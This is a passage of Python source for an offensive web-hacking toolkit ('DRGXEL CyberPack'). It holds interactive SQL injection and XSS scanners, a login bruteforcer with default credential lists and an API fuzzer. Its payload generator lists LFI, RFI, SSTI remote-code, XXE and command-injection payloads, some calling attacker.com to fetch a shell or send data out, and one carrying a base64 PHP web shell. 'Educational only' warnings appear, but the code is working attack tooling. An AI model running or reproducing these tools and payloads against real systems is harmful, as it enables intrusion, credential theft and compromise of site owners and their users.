        input("\n\033[1;33m[Press Enter to continue...]\033[0m")
        return
    
    print_info(f"Log file: {LOG_FILE}\n")
    
    try:
        with open(LOG_FILE, 'r') as f:
            logs = f.readlines()
        
        if logs:
            print(f"\033[1;33m[Recent Logs - Last {min(50, len(logs))} entries]\033[0m\n")
            
            # Display last 50 entries
            for log in logs[-50:]:
                print(f"  {log.strip()}")
            
            print(f"\n\033[1;32m[Total log entries: {len(logs)}]\033[0m")
        else:
            print_warning("Log file is empty")
        
        print("\n\033[1;33m[Options]\033[0m")
        print("1. Clear logs")
        print("0. Back")
        
        choice = input("\n[?] Select option: ").strip()
        
        if choice == '1':
            confirm = input("\n[?] Are you sure you want to clear logs? (yes/no): ").strip().lower()
            if confirm == 'yes':
                with open(LOG_FILE, 'w') as f:
                    f.write('')
                print_success("Logs cleared successfully!")
                log_activity("Logs cleared by user")
                time.sleep(2)
            else:
                print_info("Operation cancelled")
                time.sleep(1)
    
    except Exception as e:
        print_error(f"Error reading log file: {e}")
        time.sleep(2)

def sqli_checker():
    """Check for SQL Injection vulnerabilities"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ SQLi VULNERABILITY CHECKER ═══\033[0m\n")
    
    url = input("[?] Enter target URL with parameter (e.g., http://site.com/page.php?id=1): ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print_info(f"Testing {url} for SQL injection...\n")
    log_activity(f"SQLi check on {url}")
    
    # SQL injection payloads
    payloads = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "' AND 1=1 --",
        "' AND 1=2 --",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "' UNION SELECT NULL--",
        "') OR ('1'='1",
    ]
    
    # SQL error signatures
    error_signatures = [
        'sql syntax',
        'mysql_fetch',
        'mysql_num_rows',
        'mysql error',
        'warning: mysql',
        'unclosed quotation',
        'quoted string not properly terminated',
        'microsoft ole db provider for sql server',
        'incorrect syntax near',
        'syntax error',
        'odbc microsoft access driver',
        'microsoft jet database',
        'ora-01756',
        'ora-00933',
        'postgresql query failed',
        'pg_query',
        'sqlite3',
        'sqlstate',
    ]
    
    vulnerable = []
    
    try:
        # Get baseline response
        print_info("Getting baseline response...")
        req = Request(url, headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
        baseline_response = urlopen(req, timeout=10).read().decode('utf-8', errors='ignore')
        baseline_length = len(baseline_response)
        
        print_info(f"Baseline length: {baseline_length} bytes\n")
        
        for i, payload in enumerate(payloads, 1):
            # Parse URL and inject payload
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if not params:
                print_error("No parameters found in URL!")
                break
            
            # Inject into first parameter
            param_name = list(params.keys())[0]
            original_value = params[param_name][0]
            params[param_name] = [original_value + payload]
            
            # Rebuild URL
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                  parsed.params, new_query, parsed.fragment))
            
            try:
                req = Request(test_url, headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
                response = urlopen(req, timeout=10).read().decode('utf-8', errors='ignore')
                response_lower = response.lower()
                
                # Check for SQL errors
                for error_sig in error_signatures:
                    if error_sig in response_lower:
                        print_warning(f"[{i}/{len(payloads)}] VULNERABLE: {payload[:30]}")
                        print(f"    Error detected: {error_sig}")
                        vulnerable.append((payload, error_sig))
                        break
                else:
                    # Check for response length difference
                    length_diff = abs(len(response) - baseline_length)
                    if length_diff > 100:
                        print_warning(f"[{i}/{len(payloads)}] SUSPICIOUS: {payload[:30]}")
                        print(f"    Response length changed by {length_diff} bytes")
                        vulnerable.append((payload, "length_difference"))
                    else:
                        print(f"[{i}/{len(payloads)}] Testing: {payload[:30]}", end='\r')
                
                time.sleep(0.5)  # Be polite
                
            except HTTPError as e:
                if e.code == 500:
                    print_error(f"[{i}/{len(payloads)}] SERVER ERROR: {payload[:30]}")
                    vulnerable.append((payload, "500_error"))
            except:
                pass
        
        print("\n")
        if vulnerable:
            print_warning(f"⚠️  FOUND {len(vulnerable)} POTENTIAL SQLi VULNERABILITIES!")
            print("\n\033[1;33m[Vulnerable Payloads]\033[0m")
            for payload, detection in vulnerable[:10]:
                print(f"  • {payload}")
                print(f"    Detection: {detection}")
        else:
            print_success("✓ No SQL injection vulnerabilities detected")
    
    except Exception as e:
        print_error(f"Error during SQLi check: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def xss_scanner():
    """Simple XSS vulnerability scanner"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ XSS SCANNER MINI ═══\033[0m\n")
    
    url = input("[?] Enter target URL with parameter (e.g., http://site.com/search.php?q=test): ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print_info(f"Scanning {url} for XSS vulnerabilities...\n")
    log_activity(f"XSS scan on {url}")
    
    # XSS payloads
    payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '"><svg/onload=alert(1)>',
        '\'><img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
    ]
    
    vulnerable = []
    
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print_error("No parameters found in URL!")
            time.sleep(2)
            return
        
        param_name = list(params.keys())[0]
        
        for i, payload in enumerate(payloads, 1):
            # Inject payload
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                  parsed.params, new_query, parsed.fragment))
            
            try:
                req = Request(test_url, headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
                response = urlopen(req, timeout=10).read().decode('utf-8', errors='ignore')
                
                # Check if payload is reflected in response
                if payload in response:
                    print_warning(f"[{i}/{len(payloads)}] REFLECTED: {payload[:40]}")
                    vulnerable.append(payload)
                else:
                    # Check for encoded versions
                    encoded_checks = [
                        payload.replace('<', '&lt;').replace('>', '&gt;'),
                        payload.replace('"', '&quot;').replace("'", '&#39;'),
                    ]
                    
                    reflected = False
                    for encoded in encoded_checks:
                        if encoded in response:
                            print_info(f"[{i}/{len(payloads)}] ENCODED: {payload[:40]}")
                            reflected = True
                            break
                    
                    if not reflected:
                        print(f"[{i}/{len(payloads)}] Testing: {payload[:40]}", end='\r')
                
                time.sleep(0.5)
                
            except Exception as e:
                pass
        
        print("\n")
        if vulnerable:
            print_warning(f"⚠️  FOUND {len(vulnerable)} REFLECTED XSS PAYLOADS!")
            print("\n\033[1;33m[Reflected Payloads]\033[0m")
            for payload in vulnerable[:10]:
                print(f"  • {payload}")
            print("\n\033[1;31m[!] Manual verification required - check if payload executes\033[0m")
        else:
            print_success("✓ No reflected XSS detected (payloads may be filtered)")
    
    except Exception as e:
        print_error(f"Error during XSS scan: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def bruteforce_login():
    """Bruteforce login panel (educational, rate-limited)"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ BRUTEFORCE PANEL LOGIN ═══\033[0m\n")
    
    print_warning("⚠️  Rate limited: 1 request per second (educational only)")
    print_warning("⚠️  Use only on systems you own!\n")
    
    url = input("[?] Enter login URL: ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    username_field = input("[?] Username field name (default: username): ").strip() or "username"
    password_field = input("[?] Password field name (default: password): ").strip() or "password"
    
    print("\n\033[1;33m[Mode Selection]\033[0m")
    print("1. Username bruteforce (fixed password)")
    print("2. Password bruteforce (fixed username)")
    print("3. Combo bruteforce (username:password list)")
    
    mode = input("\n[?] Select mode: ").strip()
    
    log_activity(f"Login bruteforce attempt on {url}")
    
    # Internal wordlists
    usernames = ['admin', 'administrator', 'root', 'user', 'test', 'guest', 
                 'demo', 'system', 'operator', 'webadmin', 'sysadmin']
    
    passwords = ['admin', 'password', '123456', 'admin123', 'root', 'test',
                 '12345678', 'qwerty', 'abc123', 'password123', 'admin@123']
    
    combos = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('admin', '123456'),
        ('root', 'root'),
        ('root', 'toor'),
        ('administrator', 'administrator'),
        ('user', 'user'),
        ('test', 'test'),
    ]
    
    success = []
    
    try:
        import urllib.request
        import urllib.parse
        
        if mode == '1':
            password = input("[?] Enter fixed password: ").strip()
            print_info(f"\nTrying {len(usernames)} usernames...\n")
            
            for i, username in enumerate(usernames, 1):
                data = urllib.parse.urlencode({
                    username_field: username,
                    password_field: password
                }).encode('utf-8')
                
                try:
                    req = urllib.request.Request(url, data=data, 
                                                headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
                    response = urllib.request.urlopen(req, timeout=10)
                    
                    # Check for success indicators
                    response_text = response.read().decode('utf-8', errors='ignore')
                    
                    if any(x in response_text.lower() for x in ['welcome', 'dashboard', 'logout', 'success']):
                        print_success(f"[{i}/{len(usernames)}] SUCCESS: {username}:{password}")
                        success.append((username, password))
                    else:
                        print(f"[{i}/{len(usernames)}] Testing: {username}", end='\r')
                    
                    time.sleep(1)  # Rate limit
                    
                except HTTPError as e:
                    if e.code == 200:
                        print_warning(f"[{i}/{len(usernames)}] POSSIBLE: {username}")
                except:
                    pass
        
        elif mode == '2':
            username = input("[?] Enter fixed username: ").strip()
            print_info(f"\nTrying {len(passwords)} passwords...\n")
            
            for i, password in enumerate(passwords, 1):
                data = urllib.parse.urlencode({
                    username_field: username,
                    password_field: password
                }).encode('utf-8')
                
                try:
                    req = urllib.request.Request(url, data=data,
                                                headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
                    response = urllib.request.urlopen(req, timeout=10)
                    response_text = response.read().decode('utf-8', errors='ignore')
                    
                    if any(x in response_text.lower() for x in ['welcome', 'dashboard', 'logout', 'success']):
                        print_success(f"[{i}/{len(passwords)}] SUCCESS: {username}:{password}")
                        success.append((username, password))
                    else:
                        print(f"[{i}/{len(passwords)}] Testing: {password}", end='\r')
                    
                    time.sleep(1)
                    
                except:
                    pass
        
        elif mode == '3':
            print_info(f"\nTrying {len(combos)} combinations...\n")
            
            for i, (username, password) in enumerate(combos, 1):
                data = urllib.parse.urlencode({
                    username_field: username,
                    password_field: password
                }).encode('utf-8')
                
                try:
                    req = urllib.request.Request(url, data=data,
                                                headers={'User-Agent': 'DRGXEL-Scanner/2.0'})
                    response = urllib.request.urlopen(req, timeout=10)
                    response_text = response.read().decode('utf-8', errors='ignore')
                    
                    if any(x in response_text.lower() for x in ['welcome', 'dashboard', 'logout', 'success']):
                        print_success(f"[{i}/{len(combos)}] SUCCESS: {username}:{password}")
                        success.append((username, password))
                    else:
                        print(f"[{i}/{len(combos)}] Testing: {username}:{password}", end='\r')
                    
                    time.sleep(1)
                    
                except:
                    pass
        
        print("\n")
        if success:
            print_success(f"Found {len(success)} potential credentials!")
            for username, password in success:
                print(f"  • {username}:{password}")
        else:
            print_warning("No credentials found with default wordlist")
    
    except Exception as e:
        print_error(f"Error during bruteforce: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def api_fuzzer():
    """Fuzz API parameters for vulnerabilities"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ API FUZZER ═══\033[0m\n")
    
    url = input("[?] Enter API endpoint (e.g., http://api.site.com/user?id=1): ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print_info(f"Fuzzing {url}...\n")
    log_activity(f"API fuzzing on {url}")
    
    # Fuzzing payloads
    fuzz_payloads = [
        # Numeric fuzzing
        '0', '1', '-1', '999999', '2147483647',
        
        # String fuzzing
        'admin', 'test', 'root', 'user',
        
        # Special characters
        "'", '"', '<', '>', '&', '|',
        
        # Path traversal
        '../', '../../', '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        
        # Command injection
        ';ls', '|ls', '`ls`', '$(ls)',
        
        # SQL injection
        "' OR '1'='1", "1' OR '1'='1' --",
        
        # XXE
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        
        # SSTI
        '{{7*7}}', '${7*7}', '<%= 7*7 %>',
        
        # NoSQL injection
        '{"$gt":""}', '{"$ne":null}',
        
        # Array fuzzing
        '[]', '[""]', '[0]',
    ]
    
    interesting = []
    
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print_warning("No parameters in URL, fuzzing path...")
            base_url = url.rstrip('/')
            
            for i, payload in enumerate(fuzz_payloads, 1):
                test_url = f"{base_url}/{payload}"
                
                try:
                    req = Request(test_url, headers={'User-Agent': 'DRGXEL-Fuzzer/2.0'})
                    response = urlopen(req, timeout=5)
                    status = response.getcode()
                    content = response.read().decode('utf-8', errors='ignore')
                    length = len(content)
                    
                    if status == 200:
                        print_success(f"[{i}/{len(fuzz_payloads)}] [{status}] [{length}b] {payload[:30]}")
                        interesting.append((payload, status, length))
                    else:
                        print(f"[{i}/{len(fuzz_payloads)}] Testing: {payload[:30]}", end='\r')
                    
                except HTTPError as e:
                    if e.code in [403, 500]:
                        print_warning(f"[{i}/{len(fuzz_payloads)}] [{e.code}] {payload[:30]}")
                        interesting.append((payload, e.code, 0))
                except:
                    pass
                
                time.sleep(0.3)
        else:
            param_name = list(params.keys())[0]
            
            for i, payload in enumerate(fuzz_payloads, 1):
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                      parsed.params, new_query, parsed.fragment))
                
                try:
                    req = Request(test_url, headers={'User-Agent': 'DRGXEL-Fuzzer/2.0'})
                    response = urlopen(req, timeout=5)
                    status = response.getcode()
                    content = response.read().decode('utf-8', errors='ignore')
                    length = len(content)
                    
                    # Check for interesting responses
                    if 'error' in content.lower() or 'exception' in content.lower():
                        print_warning(f"[{i}/{len(fuzz_payloads)}] ERROR: {payload[:30]}")
                        interesting.append((payload, status, length, "error"))
                    elif status == 200 and length > 0:
                        print(f"[{i}/{len(fuzz_payloads)}] [{status}] [{length}b] {payload[:30]}", end='\r')
                    
                except HTTPError as e:
                    if e.code in [403, 500]:
                        print_error(f"[{i}/{len(fuzz_payloads)}] [{e.code}] {payload[:30]}")
                        interesting.append((payload, e.code, 0))
                except:
                    pass
                
                time.sleep(0.3)
        
        print("\n")
        if interesting:
            print_success(f"Found {len(interesting)} interesting responses!")
            print("\n\033[1;33m[Interesting Payloads]\033[0m")
            for item in interesting[:15]:
                if len(item) == 4:
                    payload, status, length, note = item
                    print(f"  • [{status}] {payload} - {note}")
                else:
                    payload, status, length = item
                    print(f"  • [{status}] [{length}b] {payload}")
        else:
            print_info("No particularly interesting responses found")
    
    except Exception as e:
        print_error(f"Error during fuzzing: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def network_stress_test():
    """Safe network performance benchmark"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ NETWORK STRESS TEST (SAFE MODE) ═══\033[0m\n")
    
    print_warning("⚠️  EDUCATIONAL ONLY - Performance benchmark, not attack")
    print_warning("⚠️  Use only on your own infrastructure!\n")
    
    target = input("[?] Enter target IP/domain: ").strip()
    
    if not target:
        print_error("Target cannot be empty!")
        time.sleep(2)
        return
    
    print("\n\033[1;33m[Test Mode]\033[0m")
    print("1. Ping Benchmark")
    print("2. HTTP Request Benchmark")
    print("3. Connection Benchmark")
    
    mode = input("\n[?] Select mode: ").strip()
    
    log_activity(f"Network stress test on {target}")
    
    try:
        if mode == '1':
            # Ping benchmark
            print_info(f"\nRunning ping benchmark to {target}...\n")
            
            count = int(input("[?] Number of pings (1-100): ").strip() or "10")
            count = min(count, 100)
            
            success = 0
            total_time = 0
            times = []
            
            for i in range(count):
                start = time.time()
                
                try:
                    param = '-n' if platform.system().lower() == 'windows' else '-c'
                    result = subprocess.run(['ping', param, '1', target], 
                                          capture_output=True, timeout=2)
                    
                    elapsed = (time.time() - start) * 1000
                    times.append(elapsed)
                    
                    if result.returncode == 0:
                        success += 1
                        print(f"[{i+1}/{count}] Reply: {elapsed:.2f}ms")
                    else:
                        print(f"[{i+1}/{count}] Timeout")
                    
                except subprocess.TimeoutExpired:
                    print(f"[{i+1}/{count}] Timeout")
                
                time.sleep(0.1)
            
            print(f"\n\033[1;33m[Statistics]\033[0m")
            print(f"  Sent: {count}")
            print(f"  Received: {success}")
            print(f"  Loss: {((count-success)/count*100):.1f}%")
            if times:
                print(f"  Min: {min(times):.2f}ms")
                print(f"  Max: {max(times):.2f}ms")
                print(f"  Avg: {sum(times)/len(times):.2f}ms")
        
        elif mode == '2':
            # HTTP benchmark
            url = target if target.startswith('http') else f'http://{target}'
            print_info(f"\nRunning HTTP benchmark to {url}...\n")
            
            count = int(input("[?] Number of requests (1-50): ").strip() or "10")
            count = min(count, 50)
            
            success = 0
            times = []
            
            for i in range(count):
                start = time.time()
                
                try:
                    req = Request(url, headers={'User-Agent': 'DRGXEL-Benchmark/2.0'})
                    response = urlopen(req, timeout=10)
                    elapsed = (time.time() - start) * 1000
                    times.append(elapsed)
                    
                    print(f"[{i+1}/{count}] [{response.getcode()}] {elapsed:.2f}ms")
                    success += 1
                    
                except Exception as e:
                    print(f"[{i+1}/{count}] Failed: {str(e)[:40]}")
                
                time.sleep(1)  # Rate limit
            
            print(f"\n\033[1;33m[Statistics]\033[0m")
            print(f"  Total: {count}")
            print(f"  Success: {success}")
            print(f"  Failed: {count - success}")
            if times:
                print(f"  Min: {min(times):.2f}ms")
                print(f"  Max: {max(times):.2f}ms")
                print(f"  Avg: {sum(times)/len(times):.2f}ms")
        
        elif mode == '3':
            # Connection benchmark
            port = int(input("[?] Target port (default: 80): ").strip() or "80")
            print_info(f"\nRunning connection benchmark to {target}:{port}...\n")
            
            count = int(input("[?] Number of connections (1-50): ").strip() or "10")
            count = min(count, 50)
            
            success = 0
            times = []
            
            for i in range(count):
                start = time.time()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                try:
                    result = sock.connect_ex((target, port))
                    elapsed = (time.time() - start) * 1000
                    
                    if result == 0:
                        times.append(elapsed)
                        print(f"[{i+1}/{count}] Connected: {elapsed:.2f}ms")
                        success += 1
                    else:
                        print(f"[{i+1}/{count}] Failed")
                    
                except Exception as e:
                    print(f"[{i+1}/{count}] Error: {str(e)[:30]}")
                
                finally:
                    sock.close()
                
                time.sleep(0.5)
            
            print(f"\n\033[1;33m[Statistics]\033[0m")
            print(f"  Total: {count}")
            print(f"  Success: {success}")
            print(f"  Failed: {count - success}")
            if times:
                print(f"  Min: {min(times):.2f}ms")
                print(f"  Max: {max(times):.2f}ms")
                print(f"  Avg: {sum(times)/len(times):.2f}ms")
    
    except Exception as e:
        print_error(f"Error during benchmark: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def file_metadata_extractor():
    """Extract metadata from files"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ FILE METADATA EXTRACTOR ═══\033[0m\n")
    
    filepath = input("[?] Enter file path: ").strip()
    
    if not filepath:
        print_error("File path cannot be empty!")
        time.sleep(2)
        return
    
    if not os.path.exists(filepath):
        print_error("File not found!")
        time.sleep(2)
        return
    
    print_info(f"Extracting metadata from {filepath}...\n")
    log_activity(f"Metadata extraction on {filepath}")
    
    try:
        # Basic file info
        print("\033[1;33m[File Information]\033[0m")
        stat_info = os.stat(filepath)
        print(f"  File: {os.path.basename(filepath)}")
        print(f"  Size: {stat_info.st_size} bytes ({stat_info.st_size/1024:.2f} KB)")
        print(f"  Modified: {datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Accessed: {datetime.fromtimestamp(stat_info.st_atime).strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Created: {datetime.fromtimestamp(stat_info.st_ctime).strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Check if exiftool is available
        print("\n\033[1;33m[EXIF Data]\033[0m")
        try:
            result = subprocess.run(['exiftool', filepath], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(result.stdout)
            else:
                print_warning("  exiftool not available or no EXIF data found")
                
                # Try basic image metadata extraction
                if filepath.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                    print_info("  Attempting basic image analysis...")
                    try:
                        with open(filepath, 'rb') as f:
                            # Read first bytes to check format
                            header = f.read(20)
                            
                            if header[:2] == b'\xff\xd8':
                                print("    Format: JPEG")
                            elif header[:8] == b'\x89PNG\r\n\x1a\n':
                                print("    Format: PNG")
                            elif header[:6] in (b'GIF87a', b'GIF89a'):
                                print("    Format: GIF")
                            
                            print(f"    File signature: {header[:10].hex()}")
                    except:
                        pass
        except FileNotFoundError:
            print_warning("  exiftool is not installed")
            print_info("  Install with: pkg install exiftool (Termux) or apt install libimage-exiftool-perl")
        
        # Check for hidden data
        print("\n\033[1;33m[Hidden Data Analysis]\033[0m")
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
                
                # Check for common strings
                text_data = content.decode('utf-8', errors='ignore')
                
                # Look for URLs
                urls = re.findall(r'https?://[^\s<>"{}|\\^`\[\]]+', text_data)
                if urls:
                    print(f"  URLs found: {len(urls)}")
                    for url in urls[:5]:
                        print(f"    • {url}")
                
                # Look for email addresses
                emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', text_data)
                if emails:
                    print(f"  Emails found: {len(emails)}")
                    for email in set(emails[:5]):
                        print(f"    • {email}")
                
                # Check for embedded files
                if b'PK\x03\x04' in content:
                    print("  ⚠️  ZIP archive signature detected")
                if b'%PDF' in content:
                    print("  ⚠️  PDF signature detected")
                if b'\xff\xd8\xff' in content[100:]:  # JPEG not at start
                    print("  ⚠️  JPEG signature detected (possibly embedded)")
                
        except Exception as e:
            print_error(f"  Error analyzing file: {e}")
        
        # File entropy check (simple)
        print("\n\033[1;33m[Entropy Analysis]\033[0m")
        try:
            with open(filepath, 'rb') as f:
                data = f.read(10000)  # First 10KB
                
                if len(data) > 0:
                    # Simple entropy calculation
                    byte_counts = {}
                    for byte in data:
                        byte_counts[byte] = byte_counts.get(byte, 0) + 1
                    
                    entropy = 0
                    for count in byte_counts.values():
                        p = count / len(data)
                        if p > 0:
                            entropy -= p * (p.bit_length() - 1)
                    
                    print(f"  Entropy: {entropy:.2f}")
                    
                    if entropy > 7:
                        print_warning("  High entropy - possibly encrypted or compressed")
                    elif entropy < 3:
                        print_info("  Low entropy - likely plain text or simple data")
                    else:
                        print_info("  Normal entropy")
        except:
            pass
        
    except Exception as e:
        print_error(f"Error extracting metadata: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def payload_generator():
    """Generate common security testing payloads"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ PAYLOAD GENERATOR ═══\033[0m\n")
    
    print("\033[1;33m[Payload Types]\033[0m")
    print("1. LFI (Local File Inclusion)")
    print("2. RFI (Remote File Inclusion)")
    print("3. SSTI (Server-Side Template Injection)")
    print("4. XSS (Cross-Site Scripting)")
    print("5. SQLi (SQL Injection)")
    print("6. Directory Traversal")
    print("7. Command Injection")
    print("8. XXE (XML External Entity)")
    print("0. Generate All")
    
    choice = input("\n[?] Select payload type: ").strip()
    
    log_activity(f"Payload generation - Type: {choice}")
    
    payloads = {}
    
    # LFI Payloads
    payloads['LFI'] = [
        '../../../../../etc/passwd',
        '..\\..\\..\\..\\..\\windows\\win.ini',
        '....//....//....//....//etc/passwd',
        '..%2f..%2f..%2f..%2fetc%2fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....\/....\/....\/etc/passwd',
        '/etc/passwd',
        '/etc/shadow',
        '/proc/self/environ',
        '/var/log/apache2/access.log',
        'C:\\boot.ini',
        'C:\\windows\\system32\\drivers\\etc\\hosts',
    ]
    
    # RFI Payloads
    payloads['RFI'] = [
        'http://attacker.com/shell.txt',
        'http://attacker.com/shell.txt?',
        'http://attacker.com/shell.txt%00',
        'https://pastebin.com/raw/XXXXXXXX',
        'ftp://attacker.com/shell.php',
        '//attacker.com/shell.txt',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',
        'php://input',
        'php://filter/convert.base64-encode/resource=index.php',
    ]
    
    # SSTI Payloads
    payloads['SSTI'] = [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '${{7*7}}',
        '#{7*7}',
        '*{7*7}',
        '{{config}}',
        '{{self}}',
        '{{request}}',
        '{{config.items()}}',
        '{{7*\'7\'}}',
        '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
        '${T(java.lang.Runtime).getRuntime().exec(\'calc\')}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    ]
    
    # XSS Payloads
    payloads['XSS'] = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src=x onerror="javascript:alert(1)">',
        '<svg><script>alert(1)</script></svg>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        'javascript:alert(1)',
        '<a href="javascript:alert(1)">Click</a>',
    ]
    
    # SQLi Payloads
    payloads['SQLi'] = [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' OR 1=1--",
        "') OR ('1'='1",
        "1' WAITFOR DELAY '0:0:5'--",
        "1; SELECT SLEEP(5)--",
    ]
    
    # Directory Traversal
    payloads['Directory Traversal'] = [
        '../',
        '..\\',
        '..../',
        '....\\',
        '../../../',
        '..%2f',
        '%2e%2e%2f',
        '..;/',
        '..//..//',
        '....',
        '..%00/',
        '..%0d/',
        '..%5c',
        '..%c0%af',
        '..%c1%9c',
    ]
    
    # Command Injection
    payloads['Command Injection'] = [
        '; ls',
        '| ls',
        '|| ls',
        '& ls',
        '&& ls',
        '`ls`',
        '$(ls)',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '; whoami',
        '| whoami',
        '`whoami`',
        '$(whoami)',
        '; sleep 5',
        '| sleep 5',
        '; ping -c 5 attacker.com',
        '| curl http://attacker.com',
    ]
    
    # XXE Payloads
    payloads['XXE'] = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><data>&xxe;</data>',
    ]
    
    try:
        if choice == '0':
            # Generate all payloads
            print("\n\033[1;36m═══ GENERATING ALL PAYLOADS ═══\033[0m\n")
            
            for payload_type, payload_list in payloads.items():
                print(f"\033[1;33m[{payload_type} Payloads - {len(payload_list)} total]\033[0m")
                for i, payload in enumerate(payload_list[:5], 1):
                    print(f"  {i}. {payload}")
                if len(payload_list) > 5:
                    print(f"  ... and {len(payload_list) - 5} more")
                print()
            
            # Save to file option
            save = input("[?] Save all payloads to file? (y/n): ").strip().lower()
            if save == 'y':
                filename = f"drgxel_payloads_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                filepath = os.path.expanduser(f"~/{filename}")
                
                with open(filepath, 'w') as f:
                    f.write("# DRGXEL CyberPack - Generated Payloads\n")
                    f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("# WARNING: For educational/authorized testing only\n\n")
                    
                    for payload_type, payload_list in payloads.items():
                        f.write(f"\n{'='*60}\n")
                        f.write(f"{payload_type} PAYLOADS ({len(payload_list)} total)\n")
                        f.write(f"{'='*60}\n\n")
                        
                        for i, payload in enumerate(payload_list, 1):
                            f.write(f"{i}. {payload}\n")
                
                print_success(f"Payloads saved to: {filepath}")
        
        else:
            # Generate specific payload type
            payload_map = {
                '1': 'LFI',
                '2': 'RFI',
                '3': 'SSTI',
                '4': 'XSS',
                '5': 'SQLi',
